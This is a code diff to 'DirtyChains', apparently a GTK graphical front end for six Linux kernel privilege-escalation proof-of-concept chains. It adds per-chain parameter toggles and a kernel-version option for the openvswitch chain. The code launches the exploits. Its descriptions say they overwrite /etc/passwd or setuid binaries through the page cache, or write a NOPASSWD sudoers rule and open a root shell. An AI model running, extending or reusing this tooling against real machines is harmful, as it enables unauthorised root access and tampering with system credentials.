@@ -3693,7 +3693,7 @@ int ovswrap_main(int argc, char **argv)
 
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-10-31-r17"
+#define DF_BUILD        "2026-10-31-r18"
 #define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
@@ -3710,38 +3710,47 @@ typedef struct {
     const char *desc;    /* 说明 */
     const char *need;    /* 前提 */
     int         engine;  /* 0 = 内置 dirtychains 引擎, 1 = ovswrap 引擎 */
+    unsigned char p_t,     /* 支持一键提权 -t 指定目标 */
+                  p_write, /* 支持 -to/-set 通用写 */
+                  p_off;   /* 支持 -offset 起始偏移 */
 } Chain;
 
 static const Chain chains[] = {
     { "-2026-31431", "31431 · Copy Fail",
       "CVE-2026-31431  AF_ALG / AEAD",
       "splice 文件页进 AEAD, 原地解密写 4 字节",
-      "需 authencesn(hmac(sha256),cbc(aes)) + algif_aead", 0 },
+      "需 authencesn(hmac(sha256),cbc(aes)) + algif_aead", 0,
+      1, 1, 1 },
 
     { "-2026-43284", "43284 · XFRM/ESP",
       "CVE-2026-43284  XFRM / ESP",
       "splice + esp_input 原地解密, 写 ESN 高 32 位",
-      "需非特权 userns + XFRM + ESP", 0 },
+      "需非特权 userns + XFRM + ESP", 0,
+      0, 1, 1 },
 
     { "-2026-43500", "43500 · RxRPC",
       "CVE-2026-43500  RxRPC / RXKAD",
       "8 字节 pcbc(fcrypt) 原地解密, 改 /etc/passwd 首行",
-      "需 AF_RXRPC + RXKAD, 写位置固定", 0 },
+      "需 AF_RXRPC + RXKAD, 写位置固定", 0,
+      1, 0, 0 },
 
     { "-2026-43494", "43494 · io_uring",
       "CVE-2026-43494  io_uring + RDS",
       "页引用计数劫持, 整页替换 setuid 文件",
-      "需 IORING_REGISTER_CLONE_BUFFERS (6.12+)", 0 },
+      "需 IORING_REGISTER_CLONE_BUFFERS (6.12+)", 0,
+      1, 1, 1 },
 
     { "-2026-46331", "46331 · act_pedit",
       "CVE-2026-46331  net/sched act_pedit",
       "sendfile 进 loopback, pedit 改 TCP 头, 写穿页缓存",
-      "需 act_pedit + clsact + userns", 0 },
+      "需 act_pedit + clsact + userns", 0,
+      1, 1, 1 },
 
     { "-2026-64531", "64531 · OVS CT",
       "CVE-2026-64531  net/openvswitch CT action",
       "伪造 SET action 越界读内核内存, dst_release 递减改 cred",
-      "需 openvswitch + userns，偏移读 offset/ 配置表", 1 },
+      "需 openvswitch + userns，偏移读 offset/ 配置表", 1,
+      0, 0, 0 },
 };
 #define N_CHAINS ((int)(sizeof(chains) / sizeof(chains[0])))
 
@@ -3786,6 +3795,13 @@ typedef struct {
     GtkWidget *combo;
     GtkWidget *lbl_name, *lbl_desc, *lbl_need;
     GtkWidget *entry_target, *entry_to, *entry_set, *entry_offset;
+    GtkWidget *entry_krec;   /* OVS 链: 指定内核版本匹配 offset/ 表 */
+    /* 参数面板各行的标签/按钮, 便于按所选 CVE 显隐 */
+    GtkWidget *lbl_t, *browse_t;
+    GtkWidget *lbl_to, *browse_to;
+    GtkWidget *lbl_set, *browse_set;
+    GtkWidget *lbl_off, *off_row;
+    GtkWidget *lbl_krec;
     GtkWidget *chk_nobackup, *chk_verbose;
     GtkWidget *btn_check, *btn_test, *btn_lpe, *btn_write, *btn_find, *btn_stop;
     GtkWidget   *logview;
@@ -4690,6 +4706,50 @@ static void update_cve_hint(App *a)
 
 static void side_select(App *a, int idx);
 
+/*
+ * 参数面板按所选 CVE 显隐: 每条链支持的参数不一样,
+ * 不支持的一整行藏起来, 选中哪条就只露哪条的参数。
+ * 未选择时全部显示。
+ */
+static void sync_params_ui(App *a)
+{
+    const Chain *c = cur_chain(a);
+    gboolean all = (c == NULL);
+
+    gtk_widget_set_visible(a->lbl_t,    all || c->p_t);
+    gtk_widget_set_visible(a->browse_t, all || c->p_t);
+    gtk_widget_set_visible(a->entry_target, all || c->p_t);
+
+    gtk_widget_set_visible(a->lbl_to,    all || c->p_write);
+    gtk_widget_set_visible(a->browse_to, all || c->p_write);
+    gtk_widget_set_visible(a->entry_to,  all || c->p_write);
+
+    gtk_widget_set_visible(a->lbl_set,    all || c->p_write);
+    gtk_widget_set_visible(a->browse_set, all || c->p_write);
+    gtk_widget_set_visible(a->entry_set,  all || c->p_write);
+
+    gtk_widget_set_visible(a->lbl_off,  all || c->p_off);
+    gtk_widget_set_visible(a->off_row,  all || c->p_off);
+
+    gtk_widget_set_visible(a->lbl_krec,  all ? FALSE : c->engine == 1);
+    gtk_widget_set_visible(a->entry_krec, all ? FALSE : c->engine == 1);
+
+    if (!all) {
+        /* 占位提示随链微调 */
+        if (c->engine == 1)
+            gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target), "");
+        else if (!strcmp(c->id, "-2026-43500"))
+            gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target),
+                                           "目标文件 (默认 /etc/passwd)");
+        else
+            gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target),
+                                           "留空则自动选择 setuid-root 的 su");
+        gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_to),
+            (c->p_write && !strcmp(c->id, "-2026-43494"))
+                ? "整页 4096 字节覆盖 (需页对齐)" : "要被覆盖的文件 (只需可读)");
+    }
+}
+
 static void on_combo_changed(GtkComboBox *box, gpointer data)
 {
     App *a = data;
@@ -4700,6 +4760,7 @@ static void on_combo_changed(GtkComboBox *box, gpointer data)
     side_select(a, gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo)));
     sync_cve_box(a);
     update_cve_hint(a);
+    sync_params_ui(a);
 }
 
 /* 简易提示对话框 */
@@ -4832,7 +4893,7 @@ static void act_lpe(GtkWidget *w, gpointer data)
     const Chain *c = cur_chain(a);
     char *args[8];
     int n = 0;
-    const char *tgt;
+    const char *tgt = NULL;
     char cmd[600];
 
     if (!c) {
@@ -4845,15 +4906,22 @@ static void act_lpe(GtkWidget *w, gpointer data)
 
     /* OVS 链走另一套参数：-start 直接在 host 上写 sudoers 并弹 root shell */
     if (c->engine == 1) {
-        char *ovs_args[3];
+        char *ovs_args[5];
         int on = 0;
+        const char *krec;
 
         ovs_args[on++] = "-start";
+        if ((krec = entry_text(a->entry_krec)) != NULL) {
+            ovs_args[on++] = "-krec";
+            ovs_args[on++] = (char *)krec;
+        }
         if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
             ovs_args[on++] = "-v";
         ovs_args[on] = NULL;
 
-        g_snprintf(cmd, sizeof(cmd), "%s --ovs -start", a->poc_path);
+        g_snprintf(cmd, sizeof(cmd), "%s --ovs -start%s%s",
+                   a->poc_path,
+                   krec ? " -krec " : "", krec ? krec : "");
         if (!confirm_run(a, c->name, cmd,
                          "这条链会在 /etc/sudoers.d 下写一条 "
                          "NOPASSWD 规则，然后打开 root shell。"))
@@ -4864,7 +4932,7 @@ static void act_lpe(GtkWidget *w, gpointer data)
 
     args[n++] = (char *)c->id;
     args[n++] = "-start";
-    if ((tgt = entry_text(a->entry_target)) != NULL) {
+    if (c->p_t && (tgt = entry_text(a->entry_target)) != NULL) {
         args[n++] = "-t";
         args[n++] = (char *)tgt;
     }
@@ -5247,7 +5315,9 @@ static GtkWidget *build_params(App *a)
     gtk_widget_set_hexpand(a->entry_target, TRUE);
     gtk_grid_attach(GTK_GRID(grid), a->entry_target, 1, 0, 1, 1);
 
+    a->lbl_t = lbl;
     browse = make_file_button("选择 setuid 目标", a->entry_target);
+    a->browse_t = browse;
     gtk_grid_attach(GTK_GRID(grid), browse, 2, 0, 1, 1);
 
     /* -to 目标 */
@@ -5261,7 +5331,9 @@ static GtkWidget *build_params(App *a)
     gtk_widget_set_hexpand(a->entry_to, TRUE);
     gtk_grid_attach(GTK_GRID(grid), a->entry_to, 1, 1, 1, 1);
 
+    a->lbl_to = lbl;
     browse = make_file_button("选择目标文件", a->entry_to);
+    a->browse_to = browse;
     gtk_grid_attach(GTK_GRID(grid), browse, 2, 1, 1, 1);
 
     /* -set 内容 */
@@ -5275,13 +5347,16 @@ static GtkWidget *build_params(App *a)
     gtk_widget_set_hexpand(a->entry_set, TRUE);
     gtk_grid_attach(GTK_GRID(grid), a->entry_set, 1, 2, 1, 1);
 
+    a->lbl_set = lbl;
     browse = make_file_button("选择内容文件", a->entry_set);
+    a->browse_set = browse;
     gtk_grid_attach(GTK_GRID(grid), browse, 2, 2, 1, 1);
 
     /* 偏移 + 选项 */
     lbl = gtk_label_new("-offset");
     gtk_widget_set_halign(lbl, GTK_ALIGN_END);
     gtk_grid_attach(GTK_GRID(grid), lbl, 0, 3, 1, 1);
+    a->lbl_off = lbl;
 
     {
         GtkWidget *row = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
@@ -5303,8 +5378,24 @@ static GtkWidget *build_params(App *a)
                                     "输出更多调试信息 (-v)，用于定位失败原因。");
         gtk_box_pack_start(GTK_BOX(row), a->chk_verbose, FALSE, FALSE, 0);
 
+        a->off_row = row;
         gtk_grid_attach(GTK_GRID(grid), row, 1, 3, 2, 1);
     }
+
+    /* 内核版本 (仅 OVS 链): 强制用哪个内核的 offset/ 表 */
+    lbl = gtk_label_new("内核版本");
+    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
+    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 4, 1, 1);
+    a->lbl_krec = lbl;
+
+    a->entry_krec = gtk_entry_new();
+    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_krec),
+                                   "如 5.8.0-59-generic (仅 OVS 链)，留空自动匹配");
+    gtk_widget_set_tooltip_text(a->entry_krec,
+                                "传给 OVS 链的 -krec 参数，强制匹配 offset/ 下"
+                                "指定内核版本的偏移表；留空则按运行内核自动选。");
+    gtk_widget_set_hexpand(a->entry_krec, TRUE);
+    gtk_grid_attach(GTK_GRID(grid), a->entry_krec, 1, 4, 2, 1);
 
     return grid;
 }
@@ -6112,6 +6203,9 @@ int main(int argc, char **argv)
     build_window(&app);
 
     gtk_widget_show_all(app.window);
+
+    /* 未选择 CVE: 参数面板隐藏 OVS 专属行 (内核版本) */
+    sync_params_ui(&app);
 
     /* 启动横幅写入日志 */
     {
